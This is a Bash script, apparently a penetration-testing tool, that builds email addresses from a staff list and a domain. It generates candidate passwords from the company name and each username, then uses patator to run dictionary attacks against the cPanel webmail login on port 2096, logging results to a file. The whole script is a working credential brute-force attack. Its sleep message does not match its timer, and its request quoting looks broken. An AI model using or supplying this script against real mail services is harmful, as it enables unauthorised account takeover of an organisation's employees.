#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
RESET='\e[0m'

#iptables -I INPUT -p icmp --icmp-type 8 -j DROP
   

echo  "               _                     _ _   _            _            "
echo  "              | |                   (_) | | |          | |           "
echo  " __      _____| |__  _ __ ___   __ _ _| | | |_ ___  ___| |_ ___ _ __ "
#echo  " \ \ /\ / / _ \  _ \|  _ ` _ \ / _` | | | | __/ _ \/ __| __/ _ \  __|"
echo  "  \ V  V /  __/ |_) | | | | | | (_| | | | | ||  __/\__ \ ||  __/ |   "
echo  "   \_/\_/ \___|_.__/|_| |_| |_|\__,_|_|_|  \__\___||___/\__\___|_|   "
echo  " "                                                                                                                                         
echo  " "
echo ''
echo '					daniel.torres@owasp.org'
echo '				https://github.com/DanielTorres1'
echo ''


while getopts ":d:f:e:" OPTIONS
do
            case $OPTIONS in            
            f)     FILE=$OPTARG;;
            d)     DOMINIO=$OPTARG;;
            e)     EMPRESA=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

FILE=${FILE:=NULL}
EMPRESA=${EMPRESA:=NULL}

if [ $FILE = NULL ] ; then

echo "|              														 			"
echo "| USO: webmail.sh -f [Lista del personal]  -d [dominio, usado para generar mails] -e [empresa, usado para generar passwords]"
echo "|																		 			"
echo "|  Author:daniel.torres@owasp.org                              			"
echo ""
exit
fi
######################


for user in $(cat $FILE ); do
	#echo $line | tr "," "\n" | tr 'A-Z' 'a-z' > base1.txt
	echo $EMPRESA >> base.txt
	echo $user >> base.txt
	passGen.sh -f base.txt -t top200 -o passwords.txt
			
	mail=`echo $user`"@$DOMINIO"
	echo ""
	echo -e "$OKBLUE #### Ataque a diccionario al usuario $mail  #### $RESET "  | tee -a webmail.txt
	echo -e "$OKRED Usando diccionario de passwords: `wc -l passwords.txt`$RESET "  | tee -a webmail.txt
	patator http_fuzz accept_cookie=1 auto_urlencode=1 url=https://www.$DOMINIO:2096/login/ method=POST body="\"user=$mail&pass=FILE0&login=\" 0=passwords.txt  | tee -a webmail.txt
	echo "Durmiendo por 5min"
	rm passwords.txt
	sleep 600
done





